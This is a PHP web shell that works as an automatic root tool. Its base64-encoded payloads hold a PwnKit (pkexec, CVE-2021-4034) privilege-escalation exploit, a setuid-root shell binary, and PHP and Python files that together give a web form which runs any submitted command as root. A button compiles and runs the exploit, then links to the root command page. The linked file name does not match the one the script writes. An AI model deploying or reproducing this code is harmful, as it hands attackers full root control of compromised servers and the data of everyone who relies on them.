<!DOCTYPE html>
<html>
	<head>
		<title>ユ ウ キ</title>
		<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
	</head>
</html>
<?php
error_reporting(0);
function exe($cmd) {
	if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	}
}

$check_system = (function_exists('system')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$python = (exe('python --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$gcc = (exe('gcc --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$pkexec = (exe('pkexec --version')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";

function yuuki_rootc() {
	// privesc file
	$privesc = "LyoKICogUHJvb2Ygb2YgQ29uY2VwdCBmb3IgUHduS2l0OiBMb2NhbCBQcml2aWxlZ2UgRXNjYWxhdGlvbiBWdWxuZXJhYmlsaXR5IERpc2NvdmVyZWQgaW4gcG9sa2l04oCZcyBwa2V4ZWMgKENWRS0yMDIxLTQwMzQpIGJ5IEFuZHJpcyBSYXVndWxpcyA8bW9vQGFydGhlcHN5LmV1PgogKiBBZHZpc29yeTogaHR0cHM6Ly9ibG9nLnF1YWx5cy5jb20vdnVsbmVyYWJpbGl0aWVzLXRocmVhdC1yZXNlYXJjaC8yMDIyLzAxLzI1L3B3bmtpdC1sb2NhbC1wcml2aWxlZ2UtZXNjYWxhdGlvbi12dWxuZXJhYmlsaXR5LWRpc2NvdmVyZWQtaW4tcG9sa2l0cy1wa2V4ZWMtY3ZlLTIwMjEtNDAzNAogKi8KI2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdGRsaWIuaD4KI2luY2x1ZGUgPHVuaXN0ZC5oPgoKY2hhciAqc2hlbGwgPSAKCSIjaW5jbHVkZSA8c3RkaW8uaD5cbiIKCSIjaW5jbHVkZSA8c3RkbGliLmg+XG4iCgkiI2luY2x1ZGUgPHVuaXN0ZC5oPlxuXG4iCgkidm9pZCBnY29udigpIHt9XG4iCgkidm9pZCBnY29udl9pbml0KCkge1xuIgoJIglzZXR1aWQoMCk7IHNldGdpZCgwKTtcbiIKCSIJc2V0ZXVpZCgwKTsgc2V0ZWdpZCgwKTtcbiIKCSIJc3lzdGVtKFwiZXhwb3J0IFBBVEg9L3Vzci9sb2NhbC9zYmluOi91c3IvbG9jYWwvYmluOi91c3Ivc2JpbjovdXNyL2Jpbjovc2JpbjovYmluOyBybSAtcmYgJ0dDT05WX1BBVEg9LicgJ3B3bmtpdCc7IGNob3duIHJvb3Q6cm9vdCB5dXVraTsgY2htb2QgNDc3NyB5dXVraTsgL2Jpbi9zaFwiKTtcbiIKCSIJZXhpdCgwKTtcbiIKCSJ9IjsKCmNoYXIgKmdldHJvb3QgPSAKCSIjaW5jbHVkZSA8dW5pc3RkLmg+XG4iCgkiI2luY2x1ZGUgPHN0ZGlvLmg+XG4iCgkiaW50IG1haW4gKHZvaWQpXG4iCgkie1xuIgoJIglzZXRnaWQoMCk7XG4iCgkiCXNldHVpZCgwKTtcbiIKCSIJc3lzdGVtKFwiL2Jpbi9iYXNoXCIpO1xuIgoJIglyZXR1cm4gMDtcbiIKCSJ9IjsKCmludCBtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pIHsKCUZJTEUgKmZwOwoJRklMRSAqZ3I7CglzeXN0ZW0oIm1rZGlyIC1wICdHQ09OVl9QQVRIPS4nOyB0b3VjaCAnR0NPTlZfUEFUSD0uL3B3bmtpdCc7IGNobW9kIGEreCAnR0NPTlZfUEFUSD0uL3B3bmtpdCciKTsKCXN5c3RlbSgibWtkaXIgLXAgcHdua2l0OyBlY2hvICdtb2R1bGUgVVRGLTgvLyBQV05LSVQvLyBwd25raXQgMicgPiBwd25raXQvZ2NvbnYtbW9kdWxlcyIpOwoJZnAgPSBmb3BlbigicHdua2l0L3B3bmtpdC5jIiwgInciKTsKCWZwcmludGYoZnAsICIlcyIsIHNoZWxsKTsKCWZjbG9zZShmcCk7CgoJZ3IgPSBmb3BlbigiZ2V0cm9vdC5jIiwgInciKTsKCWZwcmludGYoZ3IsICIlcyIsIGdldHJvb3QpOwoJZmNsb3NlKGdyKTsKCglzeXN0ZW0oImdjYyBnZXRyb290LmMgLW8geXV1a2kiKTsKCglzeXN0ZW0oImdjYyBwd25raXQvcHdua2l0LmMgLW8gcHdua2l0L3B3bmtpdC5zbyAtc2hhcmVkIC1mUElDIik7CgljaGFyICplbnZbXSA9IHsgInB3bmtpdCIsICJQQVRIPUdDT05WX1BBVEg9LiIsICJDSEFSU0VUPVBXTktJVCIsICJTSEVMTD1wd25raXQiLCBOVUxMIH07CglleGVjdmUoIi91c3IvYmluL3BrZXhlYyIsIChjaGFyKltdKXtOVUxMfSwgZW52KTsKfQ==";

	$fp = file_put_contents('prvesc.c', base64_decode($privesc));
	return True;
}

function rootshell_py() {
	// exec root
	$rootshell = "IyEvYmluL3B5dGhvbgojIC0qLSBjb2Rpbmc6IHV0Zi04IC0qLQpmcm9tICAgIHN1YnByb2Nlc3MgaW1wb3J0IFBvcGVuLCBQSVBFLCBTVERPVVQKaW1wb3J0ICB0aW1lCmltcG9ydCAgb3MKaW1wb3J0ICBzeXMKIApleHBsb2l0ID0gJy4veXV1a2knCmNtZHMgICAgPSBzeXMuYXJndlsxXQogCnAgPSBQb3BlbihbZXhwbG9pdCwgJyddLCBzdGRvdXQ9UElQRSwgc3RkaW49UElQRSwgc3RkZXJyPVNURE9VVCkKcHJpbnQoc3RyKHAuY29tbXVuaWNhdGUoY21kcylbMF0pKQ==";
	$fp = fopen('rootshell.py', "w");
	fwrite($fp, base64_decode($rootshell));
	fclose($fp);
	return True;
}

function process() {
	$proc = "PD9waHAKaGVhZGVyKCdBY2Nlc3MtQ29udHJvbC1BbGxvdy1PcmlnaW46IConKTsKaWYoJF9QT1NUKSB7CiAgJHNlbmRfY21kID0gc3lzdGVtKCdweXRob24gcm9vdHNoZWxsLnB5ICInIC4gJF9QT1NUWyJ5dXVraSJdIC4gJyIgMj4mMScpOwogIGVjaG8oJHNlbmRfY21kKTsKfQo/Pg==";
	$fp = fopen('yuuki2.php', "w");
	fwrite($fp, base64_decode($proc));
	fclose($fp);
	return True;
}

function sendcmd() {
	$files = "PD9waHAKaWYoIWZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKSB7CgkkdXNlciA9IEBnZXRfY3VycmVudF91c2VyKCk7CgkkdWlkID0gQGdldG15dWlkKCk7CgkkZ2lkID0gQGdldG15Z2lkKCk7CgkkZ3JvdXAgPSAiPyI7Cn0gZWxzZSB7CgkkdWlkID0gQHBvc2l4X2dldHB3dWlkKHBvc2l4X2dldGV1aWQoKSk7CgkkZ2lkID0gQHBvc2l4X2dldGdyZ2lkKHBvc2l4X2dldGVnaWQoKSk7CgkkdXNlciA9ICR1aWRbJ25hbWUnXTsKCSR1aWQgPSAkdWlkWyd1aWQnXTsKCSRncm91cCA9ICRnaWRbJ25hbWUnXTsKCSRnaWQgPSAkZ2lkWydnaWQnXTsKfQoKJGtlcm5lbCA9IHBocF91bmFtZSgpOwo/PgoKPCFET0NUWVBFIGh0bWw+CjxodG1sPgoJPGhlYWQ+CgkJPHRpdGxlPuODpiDjgqYg44KtPC90aXRsZT4KCQk8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgc3JjPSJodHRwczovL2FqYXguZ29vZ2xlYXBpcy5jb20vYWpheC9saWJzL2pxdWVyeS8zLjUuMS9qcXVlcnkubWluLmpzIj48L3NjcmlwdD4KCTwvaGVhZD4KPGJvZHk+Cgk8Zm9ybSBtZXRob2Q9InBvc3QiIGFjdGlvbj0ieXV1a2kyLnBocCI+CgkJPGgyPlJPT1QgU0hFTEwgRVhFQ1VUT1I8L2gyPjxicj4KCQk8P3BocCBlY2hvKCJTWVNURU06ICRrZXJuZWw8YnI+Iik7ID8+CgkJPD9waHAgZWNobygiVUlEL0dJRDogJHVzZXIgKCAkdWlkICkgfCAkZ3JvdXAgKCAkZ2lkICk8YnI+PGJyPiIpOyA/PgoJCTxpbnB1dCB0eXBlPSd0ZXh0JyBuYW1lPSJ5dXVraSIgaWQ9J3l1dWtpJz48L2lucHV0PgoJCTxidXR0b24gaWQ9ImJ0biIgdHlwZT0ic3VibWl0Ij5LaXJpbTwvYnV0dG9uPgoJPC9mb3JtPgoJPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPgoJCSQoZnVuY3Rpb24oKXsKCQkJJCgiZm9ybSIpLnN1Ym1pdChmdW5jdGlvbigpewoJCQkJJC5hamF4KHsKCQkJCQl1cmw6JCh0aGlzKS5hdHRyKCJhY3Rpb24iKSwKCQkJCQlkYXRhOiQodGhpcykuc2VyaWFsaXplKCksCgkJCQkJdHlwZTokKHRoaXMpLmF0dHIoIm1ldGhvZCIpLAoJCQkJCWRhdGFUeXBlOiAnaHRtbCcsCgkJCQkJYmVmb3JlU2VuZDogZnVuY3Rpb24oKSB7CgkJCQkJCSQoImlucHV0IikuYXR0cigiZGlzYWJsZWQiLHRydWUpOwoJCQkJCQkkKCJidXR0b24iKS5hdHRyKCJkaXNhYmxlZCIsdHJ1ZSk7CgkJCQkJfSwKCQkJCQljb21wbGV0ZTpmdW5jdGlvbigpIHsKCQkJCQkJJCgiaW5wdXQiKS5hdHRyKCJkaXNhYmxlZCIsZmFsc2UpOwoJCQkJCQkkKCJidXR0b24iKS5hdHRyKCJkaXNhYmxlZCIsZmFsc2UpOwkJCQkJCQkJCgkJCQkJfSwKCQkJCQlzdWNjZXNzOmZ1bmN0aW9uKGhhc2lsKSB7CgkJCQkJCXZhciB0eHQgPSAkKCIjeXV1a2kiKTsKCQkJCQkJaWYodHh0LnZhbCgpLnRyaW0oKS5sZW5ndGggPCAxKSB7CgkJCQkJCQlhbGVydCgiaW5wdXQgY21kIGJlZm9yZVNlbmQiKTsKCQkJCQkJfWVsc2V7CgkJCQkJCQkkKCIjc2hlbGxyZXNwb24iKS5odG1sKCc8cHJlPicgKyBoYXNpbCArICc8L3ByZT4nKTsKCQkJCQkJCSQoImZvcm0iKVswXS5yZXNldCgpOwoJCQkJCQkJc2V0VGltZW91dChmdW5jdGlvbigpewoJCQkJCQkJCSQoImlucHV0IikuZm9jdXMoKTsKCQkJCQkJCX0sMTAwMCk7CgkJCQkJCX0KCQkJCQl9CgkJCQl9KQoJCQlyZXR1cm4gZmFsc2U7CgkJCX0pOwoJCX0pOwoJPC9zY3JpcHQ+Cgk8ZGl2IGlkPSJzaGVsbHJlc3BvbiI+PC9kaXY+Cgk8L2JvZHk+CjwvaHRtbD4=";
	$fp = fopen('rootshell.php', "w");
	fwrite($fp, base64_decode($files));
	fclose($fp);
	return True;
}

if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}

$kernel = php_uname();
echo("SYSTEM: $kernel<br>");
echo("UID/GID: $user ( $uid ) | $group ( $gid )<br>");
echo("SYSTEM_FUNCTION: $check_system | GCC: $gcc | PYTHON: $python | PKEXEC: $pkexec</br>");

echo("<br><br>make sure system_function, gcc, python, pkexec all enabled<br>");

?>
<form method='POST' action=''>
	<input type="submit" name="gass" value="touch me senpai!!!"></input>
</form>
<?php
if(isset($_POST['gass'])) {
	$spawn_rootc = yuuki_rootc();
	if($spawn_rootc) {
		if(file_exists('prvesc.c')) {
			$gass = system('gcc prvesc.c -o prvesc; chmod +x prvesc; ./prvesc');
			if(file_exists('yuuki')) {
				$makefile_rootshellpy = rootshell_py();
				$makefile_process = process();
				$make_sendcmd = sendcmd();
				if($make_sendcmd) {
					echo("w00t, <a href='configg_.php' target='_blank'>klik here</a> and enjoy run command as root ^_^");
				}
			} else {
				print('Can\'t root this server!');
			}
		} else {
			print('Can\'t write file!');
		}
	}
}
?>
